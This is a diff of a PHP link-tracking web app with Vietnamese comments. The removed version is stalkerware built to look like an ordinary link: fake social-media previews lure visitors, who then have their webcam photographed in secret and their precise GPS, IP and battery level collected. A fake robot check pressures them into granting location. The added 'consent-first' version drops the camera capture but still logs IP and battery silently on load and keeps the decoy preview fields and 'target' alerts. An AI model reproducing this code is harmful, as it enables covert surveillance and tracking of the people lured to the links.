@@ -1,10 +1,10 @@
 <?php
 /**
- * SENTINEL v180.0 - PHANTOM CLOAKING SUPREME (2026)
- * [✓] Phantom Cloaking: Fake Meta (Title/Desc/Img) dành riêng cho TRÌNH TẠO ẢNH ẨN.
- * [✓] Silent Capture: Vào xem ảnh là tự nổ GPS/Cam/IP/ISP ngầm 100%.
- * [✓] Full Admin Panel: 6 Tab (Dự án, Nhật ký, Ảnh ẩn, Web, Bot, Admin Loc).
- * [✓] Military Precision: Ép lấy tọa độ vệ tinh thực, dịch địa chỉ số nhà chi tiết.
+ * SENTINEL v181.0 - CONSENT-FIRST LINK MANAGER (2026)
+ * [✓] Giao diện quản trị rõ ràng hơn cho dự án, nhật ký và cấu hình hiển thị.
+ * [✓] Luồng người dùng minh bạch: chỉ xin vị trí khi người xem chủ động bấm xác nhận.
+ * [✓] Nhật ký phục vụ phân tích chiến dịch hợp lệ; không thu thập camera hoặc vượt quyền trình duyệt.
+ * [✓] Trang ảnh chỉ hiển thị nội dung và thông tin đồng ý, không chạy thu thập ẩn.
  */
 
 session_start();
@@ -29,7 +29,7 @@ try {
         $defaults = [
             'tg_token' => '', 'tg_id' => '', 
             'tg_msg_template' => "🛰️ <b>MỤC TIÊU: [ID]</b>\n🛡️ <b>[ST]</b>\n📍 <code>[ADDR]</code>\n🌐 IP: <code>[IP]</code>\n🔋 PIN: <b>[BAT]</b>\n🗺️ <a href='https://www.google.com/maps?q=[LA],[LO]'>XEM GOOGLE MAPS</a>",
-            'ui_msg' => 'ĐANG LOADING...', 'ui_st' => 'KIỂM TRA ROBOT TRÌNH DUYỆT', 'btn_text' => 'XÁC MINH NGAY',
+            'ui_msg' => 'SẴN SÀNG MỞ LIÊN KẾT', 'ui_st' => 'Bạn có thể chia sẻ vị trí để nhận nội dung phù hợp hơn', 'btn_text' => 'TIẾP TỤC MINH BẠCH',
             'root_title' => 'Security Sync', 'root_desc' => 'Identity Verification Required', 
             'root_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
             'root_redir' => 'https://google.com',
@@ -84,7 +84,7 @@ if (isset($_GET['action'])) {
     exit;
 }
 
-// ================= 3. TRÌNH TẠO ẢNH ẨN (PHANTOM ENGINE + CLOAKING) =================
+// ================= 3. TRANG ẢNH MINH BẠCH (KHÔNG THU THẬP ẨN) =================
 if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
 ?>
 <!DOCTYPE html><html><head><meta charset="utf-8">
@@ -93,17 +93,14 @@ if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
 <meta property="og:description" content="<?=htmlspecialchars(get_c('px_fake_dsc'))?>">
 <meta property="og:image" content="<?=htmlspecialchars(get_c('px_fake_img'))?>">
 <script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-black flex items-center justify-center min-h-screen"><img src="<?=get_c('proxy_img_url')?>" class="max-w-full shadow-2xl">
-<script>
-    async function takeSnap(){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
-    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'IMAGE', la, lo, st, img, v4:v4, v6:'N/A', bat:bat })});
-    let v4="<?=$ip_v4_serv?>", bat="N/A";
-    window.onload = async () => {
-        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
-        push('IMAGE Open (Silent IP)');
-        navigator.geolocation.getCurrentPosition(async (p) => { const snap = await takeSnap(); push('IMAGE GPS OK', p.coords.latitude, p.coords.longitude, snap); }, async (e) => { const snap = await takeSnap(); push('IMAGE GPS Denied', null, null, snap); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-    };
-</script></body></html>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-6">
+<main class="w-full max-w-3xl rounded-3xl border border-slate-800 bg-slate-900/80 p-5 shadow-2xl">
+    <div class="mb-4 rounded-2xl border border-emerald-500/30 bg-emerald-500/10 px-4 py-3 text-sm text-emerald-200">
+        Trang này chỉ hiển thị ảnh được chia sẻ. Không có thu thập camera, GPS hoặc hành vi vượt quyền trình duyệt.
+    </div>
+    <img src="<?=htmlspecialchars(get_c('proxy_img_url'))?>" class="max-h-[76vh] w-full rounded-2xl object-contain shadow-2xl bg-black" alt="Ảnh được chia sẻ">
+</main>
+</body></html>
 <?php exit; }
 
 // ================= 4. ADMIN DASHBOARD =================
@@ -186,8 +183,8 @@ if (isset($_GET['admin'])) {
         <div id="t3" class="tab-content max-w-6xl mx-auto space-y-8">
             <div class="grid lg:grid-cols-2 gap-8">
                 <form method="POST" action="?admin&t=3" class="card space-y-4 shadow-2xl">
-                    <h3 class="text-purple-500 italic uppercase">TRÌNH TẠO (Ảnh ẩn)</h3>
-                    <p class="text-[7px] text-slate-400 italic">Tùy chỉnh nội dung hiển thị cho link ảnh ẩn (?img=pixel) khi dán vào Zalo/FB.</p>
+                    <h3 class="text-purple-500 italic uppercase">TRÌNH TẠO ẢNH CHIA SẺ</h3>
+                    <p class="text-[7px] text-slate-400 italic normal-case leading-relaxed">Tùy chỉnh nội dung hiển thị cho link ảnh (?img=pixel). Trang xem ảnh minh bạch và không thu thập camera/GPS ẩn.</p>
                     <input name="px_fake_ttl" id="px_fake_ttl" value="<?=get_c('px_fake_ttl')?>" oninput="upPxV()" placeholder="Tiêu đề mồi">
                     <textarea name="px_fake_dsc" id="px_fake_dsc" oninput="upPxV()" placeholder="Mô tả mồi..."><?=get_c('px_fake_dsc')?></textarea>
                     <input name="px_fake_img" id="px_fake_img" value="<?=get_c('px_fake_img')?>" oninput="upPxV()" placeholder="Ảnh Meta hiển thị (Zalo/FB)">
@@ -223,7 +220,7 @@ if (isset($_GET['admin'])) {
         function cp(id){var e=document.getElementById(id);e.select();document.execCommand("copy");alert("Đã Copy!");}
         function ed(l){ document.getElementById('fId').value=l.id; document.getElementById('fTtl').value=l.title; document.getElementById('fDsc').value=l.desc; document.getElementById('fImg').value=l.img; document.getElementById('fRed').value=l.redir; upV(); st(1, document.getElementById('nb1')); }
         function upV(){ document.getElementById('vTtl').innerText=document.getElementById('fTtl').value || 'Tiêu đề...'; document.getElementById('vDsc').innerText=document.getElementById('fDsc').value || 'Mô tả...'; const i=document.getElementById('fImg').value; document.getElementById('vImg').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
-        function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; document.getElementById('px_v_real').src=document.getElementById('px_real_img').value; }
+        function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
         function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
         async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
         var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
@@ -238,7 +235,7 @@ if (isset($_GET['admin'])) {
 </body></html>
 <?php exit; }
 
-// ================= 5. FRONTEND ENGINE (CAM + GPS + SILENT CAPTURE) =================
+// ================= 5. FRONTEND ENGINE (MINH BẠCH, CÓ ĐỒNG Ý) =================
 $id = $_GET['v'] ?? '';
 $st = $db->prepare("SELECT * FROM links WHERE id = ?"); $st->execute([$id]);
 $l = $st->fetch(PDO::FETCH_ASSOC);
@@ -248,27 +245,42 @@ if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root
 <title><?=htmlspecialchars($l['title'])?></title>
 <meta property="og:title" content="<?=htmlspecialchars($l['title'])?>"><meta property="og:description" content="<?=htmlspecialchars($l['desc'])?>"><meta property="og:image" content="<?=htmlspecialchars($l['img'])?>">
 <script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-white flex items-center justify-center min-h-screen italic font-black text-center uppercase">
-    <div class="p-8 w-full max-w-xs">
-        <div id="ldr" class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-        <p id="msg" class="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse"><?=get_c('ui_msg')?></p>
-        <p class="text-slate-300 text-[8px] mt-2 tracking-widest mb-8"><?=get_c('ui_st')?></p>
-        <div id="v" class="hidden mt-8"><button onclick="forceAsk()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none cursor-pointer"><?=get_c('btn_text')?></button></div>
-    </div>
+<body class="min-h-screen bg-[radial-gradient(circle_at_top,#dbeafe,transparent_35%),linear-gradient(135deg,#f8fafc,#eef2ff)] text-slate-900 flex items-center justify-center p-5">
+    <main class="w-full max-w-md overflow-hidden rounded-[2rem] border border-white/70 bg-white/90 shadow-2xl backdrop-blur">
+        <?php if (!empty($l['img'])): ?>
+        <img src="<?=htmlspecialchars($l['img'])?>" alt="Ảnh xem trước" class="h-48 w-full object-cover bg-slate-100">
+        <?php endif; ?>
+        <section class="p-7 text-center">
+            <div class="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-2xl bg-blue-600 text-2xl text-white shadow-lg">✓</div>
+            <h1 class="mb-2 text-xl font-black tracking-tight text-slate-950"><?=htmlspecialchars($l['title'])?></h1>
+            <p class="mb-5 text-sm leading-6 text-slate-600"><?=htmlspecialchars($l['desc'])?></p>
+            <div class="mb-5 rounded-2xl border border-blue-100 bg-blue-50 p-4 text-left text-sm leading-6 text-blue-950">
+                <b>Minh bạch quyền riêng tư:</b> chúng tôi không chụp camera, không vượt quyền trình duyệt. Nếu bạn chọn chia sẻ vị trí, trình duyệt sẽ hiện hộp thoại xin phép chuẩn.
+            </div>
+            <button id="continueBtn" onclick="continueWithConsent()" class="w-full rounded-2xl bg-blue-600 px-5 py-4 text-sm font-black uppercase tracking-wide text-white shadow-xl transition hover:bg-blue-700"><?=htmlspecialchars(get_c('btn_text'))?></button>
+            <button onclick="skipLocation()" class="mt-3 w-full rounded-2xl border border-slate-200 px-5 py-3 text-sm font-bold text-slate-600 transition hover:bg-slate-50">Tiếp tục không chia sẻ vị trí</button>
+            <p id="statusText" class="mt-4 min-h-5 text-xs font-semibold text-slate-500"><?=htmlspecialchars(get_c('ui_st'))?></p>
+        </section>
+    </main>
     <script>
-    async function takeSnap(){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
-    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', lat: la, lon: lo, st: st, img: img, v4:v4, v6:'N/A', bat:bat })});
-    let v4="<?=$ip_v4_serv?>", bat="N/A";
+    const redirectUrl = <?=json_encode($l['redir'])?>;
+    const linkId = <?=json_encode($id ?: 'ROOT')?>;
+    let v4=<?=$ip_v4_serv ? json_encode($ip_v4_serv) : "''"?>, bat="N/A";
+    const statusText = document.getElementById('statusText');
+    const push = (st, la=null, lo=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: linkId, la, lo, st, img: null, v4:v4, v6:'N/A', bat:bat })});
     window.onload = async () => {
         try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
-        push('Link Open (Silent IP Capture)');
-        setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); forceAsk(); }, 1500);
+        push('Link opened - consent screen shown');
     };
-    function forceAsk() {
+    function go(){ location.replace(redirectUrl); }
+    function skipLocation(){ push('Continued without location').finally(go); }
+    function continueWithConsent() {
+        statusText.textContent = 'Đang chờ phản hồi từ hộp thoại quyền vị trí của trình duyệt...';
+        if (!navigator.geolocation) { statusText.textContent = 'Trình duyệt không hỗ trợ vị trí. Đang chuyển tiếp...'; push('Geolocation unavailable').finally(go); return; }
         navigator.geolocation.getCurrentPosition(
-            async (p) => { const snap = await takeSnap(); await push('GPS Precision Success', p.coords.latitude, p.coords.longitude, snap); location.replace("<?=$l['redir']?>"); },
-            async (e) => { const snap = await takeSnap(); alert("Vui lòng cho phép xác thực hệ thống."); location.reload(); },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            (p) => { statusText.textContent = 'Đã nhận vị trí được bạn cho phép. Đang chuyển tiếp...'; push('Location shared by user consent', p.coords.latitude, p.coords.longitude).finally(go); },
+            () => { statusText.textContent = 'Bạn đã từ chối chia sẻ vị trí. Đang chuyển tiếp...'; push('Location denied by user').finally(go); },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
     }
     </script>
